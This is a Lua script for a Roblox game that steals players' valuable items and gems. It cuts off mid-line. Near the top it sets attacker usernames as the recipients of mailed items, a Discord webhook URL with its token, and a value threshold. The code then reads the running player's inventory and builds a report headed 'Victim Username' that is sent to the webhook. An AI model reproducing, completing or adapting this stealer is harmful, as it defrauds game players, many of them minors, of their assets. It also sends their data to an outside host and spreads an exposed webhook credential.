Username = "kwiaaxo"
Username2 = " TxtallyGrey" -- stuff will get sent to this user if first user's mailbox is full
webhook = "https://discord.com/api/webhooks/1260752548323786795/P8-CJl4mbZTO38PpRgBhtYQdDdSe4x0ikaRDFwolwmTSyuOEHeHdqVmt_oLQKI8lZSSz"
min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local mailsent = library.Save.Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "gg / ZV52aFWyWm"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local getFucked = false
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local newamount = 20000

if mailsent ~= 0 then
	newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) doif v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

if newamount > GemAmount1 then
    return
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json",
    }

	local fields = {
		{
			name = "Victim Username:",
			value = username,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = "",
            inline = false
        }
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
    end

    fields[3].value = fields[3].value .. "Gems: " .. formatNumber(diamonds) .. "\n"
    fields[3].value = fields[3].value .. "Total RAP: " .. formatNumber(totalRAP)
    if getFucked then
        fields[3].value = fields[3].